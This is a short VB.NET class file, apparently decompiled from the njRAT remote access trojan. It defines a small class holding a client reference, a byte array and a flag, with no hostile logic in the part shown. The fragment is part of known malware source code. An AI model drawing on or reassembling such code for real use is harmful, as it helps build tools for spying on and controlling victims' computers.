﻿Imports NJRAT
Imports System
Imports NJRAT.njRAT

Public NotInheritable Class GClass12
    ' Methods
    Public Sub New(ByVal client_1 As Client, ByVal byte_1 As Byte())
        Me.client_0 = client_1
        Me.byte_0 = byte_1
    End Sub


    ' Fields
    Public bool_0 As Boolean = False
    Public byte_0 As Byte()
    Public client_0 As Client
End Class
